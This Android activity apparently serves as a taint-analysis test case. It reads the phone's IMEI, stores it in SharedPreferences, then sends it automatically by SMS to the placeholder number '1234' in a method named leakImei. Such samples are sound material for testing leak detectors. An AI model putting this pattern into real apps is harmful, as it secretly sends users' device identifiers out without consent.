package com.example.shiva.sharedpreference;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import static android.app.PendingIntent.getActivity;

public class MainActivity extends AppCompatActivity {
    public static final String PREFS_NAME="MyPrefsFile";
    public static final String IMEI="imei";
    SharedPreferences sharedPref;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        storeImei(getImei());
        leakImei(retriveImei());

    }
    public String getImei()
    {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String imei = telephonyManager.getDeviceId(); // Source
        return imei;
    }

    public void storeImei(String imei)
    {
        sharedPref=getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        SharedPreferences.Editor editor=sharedPref.edit();
        editor.putString(IMEI,imei);
        editor.commit();
    }

    public String retriveImei() // Retrive from shared Preference
    {
        SharedPreferences settings=getSharedPreferences(PREFS_NAME,Context.MODE_PRIVATE);
        String imei=settings.getString(IMEI,null);
        return imei;
    }

    public void leakImei(String imei)
    {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("1234", null, imei, null, null);

    }


}
